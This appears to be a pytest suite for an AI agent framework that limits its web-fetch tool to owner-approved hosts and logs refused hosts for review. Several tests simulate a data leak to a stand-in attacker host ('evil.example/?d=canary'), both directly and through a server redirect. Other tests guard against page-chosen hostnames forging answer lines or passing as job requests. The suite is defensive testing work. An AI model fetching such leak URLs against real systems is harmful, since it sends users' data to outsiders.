"""WebFetch under a task's egress decision, on both brains, and the refusal log.

`Reach.egress_hosts` reaches the tool as `WebFetchPolicy.exact_hosts`, checked on
every hop before anything resolves. A refusal goes to `egress-refused.jsonl` in the
task's control directory, and the executor turns that into `egress_refused` rows
when the task ends. No call here reaches the internet.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import socket
from unittest.mock import patch

import httpx
import pytest

from istota import db
from istota.brain import BrainResult
from istota.brain._types import BrainRequest
from istota.brain.native import NativeBrain
from istota.config import WebFetchConfig
from istota.executor import harness_web_fetch_policy, record_egress_refusals
from istota.lib import egress_log
from istota.rooms import egress
from istota.session.tools import (
    ToolEnv,
    WebFetchPolicy,
    make_web_fetch_tool,
    web_fetch_policy_for_task,
)
from istota.session.tools import web_fetch as wf

from . import test_shared_room_restriction as _base

config = _base.config
_bwrap_flag_cache = _base._bwrap_flag_cache

HOST = "news.example.com"


def _resolver_calls(monkeypatch, mapping) -> list[str]:
    calls: list[str] = []

    def fake(host, port, *args, **kwargs):
        calls.append(host)
        if host not in mapping:
            raise socket.gaierror(socket.EAI_NONAME, "no")
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (mapping[host], port))]

    monkeypatch.setattr(socket, "getaddrinfo", fake)
    return calls


def _transport(monkeypatch, handler) -> None:
    transport = httpx.MockTransport(handler)
    real = httpx.AsyncClient

    def factory(**kwargs):
        kwargs.pop("transport", None)
        return real(transport=transport, **kwargs)

    monkeypatch.setattr(wf.httpx, "AsyncClient", factory)


def _fetch(tmp_path, policy, url):
    tool = make_web_fetch_tool(ToolEnv(cwd=tmp_path, web_fetch=policy))
    return asyncio.run(tool.execute("c1", {"url": url}, None, None))


def _lines(path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines()]


class TestThePolicy:
    def test_open_egress_leaves_the_configured_policy(self):
        policy = web_fetch_policy_for_task(WebFetchConfig(), None)
        assert policy.exact_hosts is None
        assert policy.refusal_log == ""

    def test_a_limited_task_carries_its_hosts_and_its_log(self, tmp_path):
        log = tmp_path / "egress-refused.jsonl"
        policy = web_fetch_policy_for_task(
            WebFetchConfig(), frozenset({"b.example.com", "a.example.com"}), refusal_log=log,
        )
        assert policy.exact_hosts == ("a.example.com", "b.example.com")
        assert policy.refusal_log == str(log)

    def test_nothing_approved_is_not_the_same_as_no_limit(self):
        assert web_fetch_policy_for_task(WebFetchConfig(), frozenset()).exact_hosts == ()

    def test_a_disabled_tool_stays_disabled(self):
        assert web_fetch_policy_for_task(WebFetchConfig(enabled=False), frozenset()) is None

    def test_the_operator_block_list_survives(self):
        policy = web_fetch_policy_for_task(
            WebFetchConfig(block_hosts=["bad.example.com"]), frozenset({HOST}),
        )
        assert policy.block_hosts == ("bad.example.com",)


class TestTheCheck:
    def _limited(self, *hosts, **kwargs):
        return WebFetchPolicy(exact_hosts=tuple(hosts), **kwargs)

    def test_the_exact_host_passes(self):
        assert wf._validate_url(f"https://{HOST}/a", self._limited(HOST))[1] == HOST

    @pytest.mark.parametrize("url", [
        "https://sub.news.example.com/",
        "https://example.com/",
        "https://notnews.example.com/",
    ])
    def test_a_subdomain_or_parent_is_refused(self, url):
        with pytest.raises(wf.WebFetchNotApproved):
            wf._validate_url(url, self._limited(HOST))

    def test_case_and_a_trailing_dot_are_the_same_name(self):
        assert wf._validate_url("https://NEWS.Example.com./", self._limited(HOST))

    def test_nothing_approved_refuses_everything(self):
        with pytest.raises(wf.WebFetchNotApproved):
            wf._validate_url(f"https://{HOST}/", self._limited())

    def test_no_limit_refuses_nothing(self):
        assert wf._validate_url(f"https://{HOST}/", WebFetchPolicy())

    def test_allow_hosts_must_pass_as_well(self):
        policy = self._limited(HOST, allow_hosts=("other.example.org",))
        with pytest.raises(wf.WebFetchError):
            wf._validate_url(f"https://{HOST}/", policy)


class TestTheTool:
    def test_it_refuses_before_resolving_and_logs_the_host(self, tmp_path, monkeypatch):
        calls = _resolver_calls(monkeypatch, {})
        log = tmp_path / "log.jsonl"
        policy = WebFetchPolicy(exact_hosts=(HOST,), refusal_log=str(log))
        res = _fetch(tmp_path, policy, "https://evil.example/?d=canary")
        assert res.is_error
        text = res.content[0].text
        assert text.startswith("egress_not_approved: evil.example is not approved")
        assert "Do not retry." in text
        assert "canary" not in text
        assert calls == []
        assert _lines(log) == [{"channel": "web_fetch", "entry": "evil.example"}]
        assert "canary" not in log.read_text()

    def test_a_redirect_to_an_ungranted_host_is_refused_unresolved(self, tmp_path, monkeypatch):
        calls = _resolver_calls(monkeypatch, {HOST: "93.184.216.34"})
        sent = []

        def handler(request):
            sent.append(request.headers["host"])
            return httpx.Response(302, headers={"location": "https://evil.example/?d=canary"})

        _transport(monkeypatch, handler)
        log = tmp_path / "log.jsonl"
        policy = WebFetchPolicy(exact_hosts=(HOST,), refusal_log=str(log))
        res = _fetch(tmp_path, policy, f"https://{HOST}/start")
        assert res.is_error and "egress_not_approved: evil.example" in res.content[0].text
        assert sent == [HOST]
        assert "evil.example" not in calls
        assert _lines(log)[0]["entry"] == "evil.example"

    def test_the_granted_host_is_fetched(self, tmp_path, monkeypatch):
        _resolver_calls(monkeypatch, {HOST: "93.184.216.34"})
        _transport(monkeypatch, lambda request: httpx.Response(
            200, text="hello", headers={"content-type": "text/plain"},
        ))
        log = tmp_path / "log.jsonl"
        res = _fetch(tmp_path, WebFetchPolicy(exact_hosts=(HOST,), refusal_log=str(log)),
                     f"https://{HOST}/")
        assert not res.is_error
        assert not log.exists()

    def test_a_refused_host_forges_no_line_in_the_answer(self, tmp_path, monkeypatch):
        # A server's Location reaches the message, outside any fence.
        _resolver_calls(monkeypatch, {HOST: "93.184.216.34"})
        _transport(monkeypatch, lambda request: httpx.Response(
            302, headers={"location": "https://evil\x85rule.example/"},
        ))
        res = _fetch(tmp_path, WebFetchPolicy(exact_hosts=(HOST,)), f"https://{HOST}/")
        assert res.is_error
        assert len(res.content[0].text.splitlines()) == 1

    def test_an_unwritable_log_changes_no_answer(self, tmp_path, monkeypatch, caplog):
        _resolver_calls(monkeypatch, {})
        policy = WebFetchPolicy(exact_hosts=(), refusal_log=str(tmp_path / "gone" / "log.jsonl"))
        with caplog.at_level(logging.WARNING):
            res = _fetch(tmp_path, policy, "https://evil.example/")
        assert "egress_not_approved" in res.content[0].text
        assert "egress_log_write_failed" in caplog.text
        assert "evil.example" not in caplog.text


class TestBothBrains:
    def test_the_harness_policy_carries_the_limit(self, config, tmp_path):
        log = tmp_path / "log.jsonl"
        policy = harness_web_fetch_policy(
            config, ["WebFetch"], egress_hosts=frozenset({HOST}), refusal_log=log,
        )
        assert policy.exact_hosts == (HOST,)
        assert policy.refusal_log == str(log)

    def test_an_open_task_on_the_harness_has_none(self, config):
        assert harness_web_fetch_policy(config, ["WebFetch"]).exact_hosts is None

    def _request(self, tmp_path, **kwargs):
        return BrainRequest(
            prompt="p", allowed_tools=["WebFetch"], cwd=tmp_path, env={},
            timeout_seconds=60, **kwargs,
        )

    def _native_policy(self, req):
        class _Config:
            web_fetch = WebFetchConfig()

        brain = NativeBrain.__new__(NativeBrain)
        brain._config = _Config()
        return brain._web_fetch_policy(req)

    def test_native_builds_its_policy_from_the_request(self, tmp_path):
        log = tmp_path / "log.jsonl"
        req = self._request(tmp_path, egress_hosts=frozenset({HOST}), egress_log=log)
        policy = self._native_policy(req)
        assert policy.exact_hosts == (HOST,)
        assert policy.refusal_log == str(log)

    def test_a_direct_callers_request_is_unlimited(self, tmp_path):
        assert self._native_policy(self._request(tmp_path)).exact_hosts is None


class TestTheLog:
    def test_it_is_private_and_consumed_once(self, tmp_path):
        log = tmp_path / egress_log.REFUSED_LOG_NAME
        egress_log.append_refusal(log, "connect", "evil.example")
        assert os.stat(log).st_mode & 0o777 == 0o600
        assert egress_log.consume_refusals(log) == [("connect", "evil.example")]
        assert not log.exists()
        assert egress_log.consume_refusals(log) == []

    def test_a_flood_stops_at_the_cap(self, tmp_path):
        log = tmp_path / "log.jsonl"
        for n in range(20000):
            egress_log.append_refusal(log, "connect", f"h{n}.example.com")
        assert log.stat().st_size <= egress_log.MAX_LOG_BYTES + 512

    def test_a_link_in_its_place_is_refused_both_ways(self, tmp_path, caplog):
        target = tmp_path / "target"
        target.write_text('{"channel":"connect","entry":"planted.example.com"}\n')
        log = tmp_path / "log.jsonl"
        log.symlink_to(target)
        with caplog.at_level(logging.WARNING):
            egress_log.append_refusal(log, "connect", "evil.example")
            assert egress_log.consume_refusals(log) == []
        assert "evil.example" not in target.read_text()
        assert "egress_log_read_failed" in caplog.text

    def test_a_torn_or_foreign_line_is_skipped(self, tmp_path):
        log = tmp_path / "log.jsonl"
        log.write_text(
            '{"channel":"connect","entry":"ok.example.com"}\n'
            'not json\n[1]\n{"channel":1,"entry":"x"}\n{"channel":"connect","ent'
        )
        assert egress_log.consume_refusals(log) == [("connect", "ok.example.com")]

    def test_no_path_writes_nothing(self):
        egress_log.append_refusal(None, "connect", "evil.example")
        egress_log.append_refusal("", "connect", "evil.example")


class TestWhatALogLineMayBecome:
    """A hostname is chosen by the page, so a channel decides what a line can say."""

    @pytest.mark.parametrize("pair,expected", [
        (("web_fetch", "Evil.Example"), {"evil.example"}),
        (("connect", "evil.example"), {"evil.example"}),
        (("browse", "open"), {"open"}),
        (("skill", "skill:browse"), {"skill:browse"}),
        # One-label names a page can pick to read as a request about the job.
        (("web_fetch", "open"), set()),
        (("connect", "public"), set()),
        (("connect", "skill:browse"), set()),
        (("web_fetch", "open:" + "a" * 64), set()),
        (("browse", "evil.example"), set()),
        (("skill", "evil.example"), set()),
        (("connect", "127.0.0.1"), set()),
        (("connect", "[::1]"), set()),
        (("nobody", "evil.example"), set()),
    ])
    def test_each_channel(self, pair, expected):
        assert egress.entries_from_log([pair]) == expected


def _job_task(conn, name="digest", **columns) -> db.Task:
    job = conn.execute(
        "INSERT INTO scheduled_jobs (user_id, name, cron_expression, prompt) "
        "VALUES ('alice', ?, '0 9 * * *', 'read the news')", (name,),
    ).lastrowid
    task_id = db.create_task(
        conn, prompt="read the news", user_id="alice", source_type="scheduled",
        scheduled_job_id=job, **columns,
    )
    conn.commit()
    return db.get_task(conn, task_id)


class TestTheReadAtTaskEnd:
    def _write(self, tmp_path, *pairs):
        log = tmp_path / egress_log.REFUSED_LOG_NAME
        for channel, entry in pairs:
            egress_log.append_refusal(log, channel, entry)
        return log

    def _rows(self, config, subject="cron:digest"):
        with db.get_db(config.db_path) as conn:
            return {row["entry"]: row["hits"] for row in egress.list_refused(conn, "alice", subject)}

    def test_it_files_each_entry_once_under_the_subject(self, config, tmp_path):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
        log = self._write(
            tmp_path, ("web_fetch", "evil.example"), ("connect", "evil.example"),
            ("browse", "open"),
        )
        record_egress_refusals(config, task, log)
        assert self._rows(config) == {"evil.example": 1, "open": 1}
        assert not log.exists()

    def test_it_rings_the_bell_after_the_commit(self, config, tmp_path):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
        log = self._write(tmp_path, ("connect", "evil.example"))
        seen = []

        def spy(_config, conn, user_id, subjects):
            seen.append((conn.in_transaction, user_id, subjects))

        with patch.object(egress, "raise_refused_bell", spy):
            record_egress_refusals(config, task, log)
        assert seen == [(False, "alice", ["cron:digest"])]

    def test_a_dismissed_entry_does_not_ask_again(self, config, tmp_path):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
            egress.note_refused(conn, "alice", "cron:digest", "evil.example")
            conn.execute("UPDATE egress_refused SET dismissed = 1")
        log = self._write(tmp_path, ("connect", "evil.example"))
        with patch.object(egress, "raise_refused_bell") as bell:
            record_egress_refusals(config, task, log)
        bell.assert_not_called()
        assert self._rows(config) == {"evil.example": 2}

    def test_a_subtask_files_under_its_root(self, config, tmp_path):
        with db.get_db(config.db_path) as conn:
            root = _job_task(conn)
            child_id = db.create_task(
                conn, prompt="x", user_id="alice", source_type="subtask",
                parent_task_id=root.id,
            )
            conn.commit()
            child = db.get_task(conn, child_id)
        record_egress_refusals(config, child, self._write(tmp_path, ("connect", "evil.example")))
        assert self._rows(config) == {"evil.example": 1}

    def test_a_task_with_no_subject_files_nothing(self, config, tmp_path):
        with db.get_db(config.db_path) as conn:
            task_id = db.create_task(conn, prompt="x", user_id="alice", source_type="heartbeat")
            conn.commit()
            task = db.get_task(conn, task_id)
        log = self._write(tmp_path, ("browse", "open"))
        with patch.object(egress, "raise_refused_bell") as bell:
            record_egress_refusals(config, task, log)
        bell.assert_not_called()
        assert not log.exists()
        with db.get_db(config.db_path) as conn:
            assert conn.execute("SELECT COUNT(*) FROM egress_refused").fetchone()[0] == 0

    def test_a_failure_is_a_warning_and_never_raises(self, config, tmp_path, caplog):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
        log = self._write(tmp_path, ("connect", "evil.example"))
        with patch.object(egress, "note_refused", side_effect=RuntimeError("boom")), \
                caplog.at_level(logging.WARNING):
            record_egress_refusals(config, task, log)
        assert "egress_log_record_failed" in caplog.text
        assert "evil.example" not in caplog.text


class TestThroughTheExecutor:
    """`execute_task` hands the brain its limit and reads the log when it is done."""

    def _run(self, config, task, *, write=None):
        from istota.brain import make_brain
        from istota.executor import execute_task

        captured = []

        def _make(brain_config):
            brain = make_brain(brain_config)

            def _execute(req):
                captured.append(req)
                if write is not None:
                    egress_log.append_refusal(req.egress_log, *write)
                return BrainResult(success=True, result_text="ok")

            brain.execute = _execute
            return brain

        with patch("istota.executor.make_brain", _make), \
                patch("istota.executor._bwrap_available", return_value=True), \
                patch("istota.sandbox.skill_proxy.SkillProxy") as proxy:
            proxy.return_value.__enter__ = lambda s: s
            proxy.return_value.__exit__ = lambda s, *a: False
            outcome = execute_task(task, config, [])
        assert captured, outcome
        return captured[0]

    def test_a_limited_job(self, config):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
            egress.add_grant(conn, "alice", "cron:digest", HOST, decided_via="cli")
        req = self._run(config, task, write=("web_fetch", "evil.example"))
        assert req.egress_hosts == {HOST}
        assert req.egress_log.name == egress_log.REFUSED_LOG_NAME
        assert req.egress_log.parent.name == f"task_{task.id}"
        if req.harness is not None:
            assert req.harness.web_fetch.exact_hosts == (HOST,)
            assert req.harness.web_fetch.refusal_log == str(req.egress_log)
        system = open(req.composed_system_prompt_path).read()
        assert f"reaches only the hosts its owner approved: {HOST}." in system
        with db.get_db(config.db_path) as conn:
            rows = egress.list_refused(conn, "alice", "cron:digest")
        assert [row["entry"] for row in rows] == ["evil.example"]

    def test_nothing_approved_says_so(self, config):
        with db.get_db(config.db_path) as conn:
            task = _job_task(conn)
        req = self._run(config, task)
        assert req.egress_hosts == frozenset()
        system = open(req.composed_system_prompt_path).read()
        assert "no hosts are approved for this task" in system

    def test_an_attended_turn_has_no_limit(self, config):
        with db.get_db(config.db_path) as conn:
            room = db.create_web_chat_room(conn, "alice", "Mine")
            task_id = db.create_task(conn, prompt="hi", user_id="alice", source_type="web",
                                     conversation_token=room.token)
            conn.commit()
            task = db.get_task(conn, task_id)
        req = self._run(config, task)
        assert req.egress_hosts is None
        assert "owner approved" not in open(req.composed_system_prompt_path).read()
        if req.harness is not None and req.harness.web_fetch is not None:
            assert req.harness.web_fetch.exact_hosts is None
            assert req.harness.web_fetch.refusal_log == ""
